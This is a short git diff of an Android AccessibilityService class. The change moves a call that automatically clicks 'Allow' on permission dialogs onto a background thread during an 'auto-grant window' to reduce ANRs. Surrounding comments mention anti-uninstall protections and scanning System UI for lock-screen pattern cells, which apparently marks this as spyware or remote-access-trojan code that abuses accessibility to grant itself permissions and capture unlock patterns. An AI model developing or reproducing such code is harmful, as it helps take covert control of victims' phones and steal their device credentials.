@@ -635,7 +635,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     break;
 
                 case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
-                    autoClickAllowButton();
+                    // IMPORTANT: do NOT call autoClickAllowButton() directly here.
+                    // TYPE_WINDOW_CONTENT_CHANGED fires 30-60× per second in any app with
+                    // animations or dynamic content. autoClickAllowButton() does getRootInActiveWindow()
+                    // + multiple tree traversals on the main thread — calling it on every event
+                    // is the #1 remaining ANR source.
+                    //
+                    // The 350 ms background scanner (permissionBgHandler) already covers all
+                    // the same protections (defent, uninstall-assist, active-apps, etc.).
+                    // During the 25 s auto-grant window we additionally post immediately to the
+                    // background thread so permission dialogs are clicked without delay.
+                    if (autoGrantMode && permissionBgHandler != null) {
+                        permissionBgHandler.post(this::autoClickAllowButton);
+                    }
                     if ("com.android.systemui".equals(packageName)) {
                         // Advanced Unlock: scan for pattern-lock cells
                         checkAdvancedUnlockCells(event);
